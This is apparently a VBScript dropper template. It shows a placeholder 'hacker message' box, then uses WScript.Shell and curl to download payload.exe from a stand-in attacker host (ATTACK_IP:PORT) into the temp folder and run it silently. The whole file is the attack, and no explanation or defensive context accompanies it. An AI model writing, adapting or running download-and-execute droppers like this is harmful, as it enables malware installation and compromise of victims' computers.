Dim message
message = "Insert Hacker Message Here :)"
MsgBox message
Set objShell = CreateObject("WScript.Shell")
downloadURL = "http://ATTACK_IP:PORT/payload.exe"
outputFile = "%TEMP%\\payload.exe"
command = "curl """ & downloadURL & """ -o """ & outputFile & """"
objShell.Run command, false, true
objShell.Run outputFile, false, true
